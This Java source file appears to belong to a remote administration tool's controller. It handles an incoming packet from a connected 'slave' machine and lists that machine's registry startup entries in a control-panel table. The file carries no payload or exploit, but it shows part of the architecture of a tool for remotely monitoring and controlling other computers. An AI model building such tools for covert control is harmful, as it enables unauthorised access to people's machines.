package com.redpois0n.packets.in;

import java.io.DataInputStream;

import com.redpois0n.Main;
import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlRegStart;


public class PacketREGSTART extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int count = slave.readInt();
		String[] args = new String[count];
		for (int i = 0; i < count; i++) {
			args[i] = slave.readLine();
			Main.debug("Out: " + args[i]);
		}
		
		/*if (count != 3) {
			return;
		}*/
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		
		if (frame != null && count == 3) {
			PanelControlRegStart panel = (PanelControlRegStart) frame.panels.get("registry startup");
			panel.getModel().addRow(new Object[] { panel.icon, args[0], args[1], args[2] });
		}
	}

}
